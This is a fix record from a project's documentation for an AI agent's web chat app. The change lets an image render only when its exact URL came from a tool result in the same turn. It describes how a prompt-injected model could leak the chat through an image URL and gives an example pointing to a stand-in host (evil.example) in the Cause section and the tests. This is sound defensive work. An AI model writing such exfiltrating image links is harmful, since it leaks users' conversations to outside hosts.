# FX22 · The recipe's image showed as a link: an image renders when a tool gave it

> **Status:** done · **Area:** the web apps' shared library (`louis-agent.web.shared`: `Text/Markdown`, `Chats/TurnStream`,
> `Chats/ImageSources`, `Components/`) · **Found:** 2026-10-25, F18 step 5.7 · **Fixed:** 2026-10-25 · **Planned:** one step,
> so no plan file of its own; built after F18 step 5.7.2

## Symptom

Louis, 2026-10-25: "lets do it properly but we need at least an image for the recipe, which we get from the article".
F18 step 5.7 made the cook open its recipe with one image from the recipe page (`![Bobotie](https://…)`, an image link
the page's text gave it), and the `recipe-image` grader checks it. Puls drew it as a link: the user saw the words
*Bobotie* underlined, not the dish.

## Cause

`Markdown.ToHtml` draws an image only when its host is one of `ImageHosts`, the shops' own image hosts (F33). A browser
loads an image by itself, so an image a model wrote could carry the chat in its URL to any host
(`![x](https://evil.example/?q=…)`), and a model tricked by a page can write one. A host list is the wrong rule for a
recipe: its image sits on whichever site the cook found the recipe on, and the sites change with every question.

## Fix

**Provenance, not a host list.** An image renders when its exact URL came back in a tool result of the same turn, at any
level: the cook reads the recipe page in its sub-session, and those events already reach the web app
(`TurnStream.ApplySubSession` folds them into the call's `SubTurn`, tool results included). A model can't invent a URL
that passes, so the guard holds. It is the `recipe-image` grader's rule enforced in code (ADR 0020: prompts state
intent, guards enforce). Everything is in `louis-agent.web.shared`: no change to core, the API or the stream format.

- **`ImageLinks.Of(markdown)`** (`Text/`) reads the images of a text with Markdig's `LinkInline.IsImage`, the parser
  `ToHtml` renders with, so "an image" means the same on both sides. Only `https` URLs count: an `http` image on Puls's https page is mixed content (blocked or upgraded, and sent unencrypted).
- **`Block.Images`** takes the list in `TurnStream`'s `tool_result` case, when the result arrives, before
  `ChatStore.SaveAsync` can cut the text to 4 000 characters (in memory too). It is a plain list, so it round-trips
  through the store's JSON. A failed result gives none, and neither does the result of a delegation call
  (`Delegation.IsDelegationTool`): that text is the specialist's own answer, written by a model, which proves nothing.
  Without that rule a tricked cook could write an evil image into its answer and have it pass.
- **`ImageSources.Of(turn)`** (`Chats/`) is the union of the turn's blocks' images and every sub-turn's, recursively (a
  minion inside a specialist too).
- **`Markdown.ToHtml(markdown, shown)`** takes the set: an image whose URL is in it renders as an `img`; one that isn't
  becomes a link, as before. The match is exact (a URL that differs by a query parameter is not in it). `ImageHosts`
  stays: the shops' photos keep working, and so do chats saved before this fix. The comment above the check states
  both rules.
- **The components** pass the turn's set down: `TurnView` computes it (`ImageSources.Of(Turn)`) and hands it to
  `BlocksView` as `Shown`, which passes it to its text blocks and to each `DelegationCard`, which uses it for its answer
  and for the blocks inside it. The parameter is `Shown` because it is the set of images that may be *shown*; a name like
  `Allowed` would suggest a policy, and this is a fact about what the turn's tools returned.

**Not changed:** the dialog a click on an image opens (`data-original`, `chat.js`) still loads the same file without
its size parameters. That is a load the user asked for by clicking, and it is the same file on the same host.

## What to look at

- That `Block.Images` is taken in `TurnStream`, not in the component: the text is cut by the store, and a component
  renders from what is stored.
- That the delegation call's own result is excluded, and the test that names it.
- That the set is per turn (`ImageSourcesTests`): a later turn's answer can't reuse an image an earlier turn read.

## Tests

Written first, seen failing on their assertions or on the stub (`Block.Images` empty, `ImageSources.Of` throwing the
`NotImplementedException` it was given): 9 of the 18 new tests failed, the rest of the suite stayed green.

- `TurnStreamImageTests`: a tool result's image gives its block the URL; a sub-session's result does the same on its
  `SubTurn`; a plain link, a failed result and a delegation call's result give none.
- `ImageSourcesTests`: the union, recursively; per turn.
- `MarkdownProvenanceTests`: in the set renders an `img`; not in it is a link; a URL differing by a query parameter is not
  in it; a shop host's image still renders with an empty set, a null one and none; the exfiltration case
  (`https://evil.example/?q=the+chat`) renders no `img`; an unsafe URL is never an image.
- `TurnViewImageTests` (bUnit): a Puls turn whose cook read a page with the image renders the `img` in the parent's text
  and in the delegation card's answer; the same answer without the image in any result renders a link. The golden
  `.html` files did not move: the recorded turn has no image from a non-shop host.
- `ChatStoreImageTests`: after `SaveAsync` cuts a result whose image link lies beyond 4 000 characters, the turn still has
  the image, in memory and after the store's JSON.

## Known limit

Per turn, not per chat: an answer can't show an image that only an earlier turn's tool read. A follow-up that wants the
image again has the cook read the page again (a continued specialist does, as its text is a new answer). Widen the set to
the chat only when a real case needs it.

A tool that echoes its input could make a model-chosen URL look like a tool gave it. Low risk: `FetchUrl` can already reach any
host, so the URL a model wants is one it could have fetched; a tool that merely echoes would be the new way in, and none does today.

## Confirmed

The tests above, and the whole solution's tests. A check in the browser against the Puls stack (a cook answer showing
the recipe's image) is still to do: the stack was not up when this was written.

## Lesson

A guard that names hosts guards against yesterday's hosts. What a page should be allowed to load is what the turn's own
tools returned, which a model can repeat but not invent: the same shape as ADR 0004's arguments as data, applied to
output.

---
[Fixes](README.md) · [F18 step 5.7](../features/F18-evaluation.md) · [ADR 0020](../adr/0020-principles-for-every-agent.md)
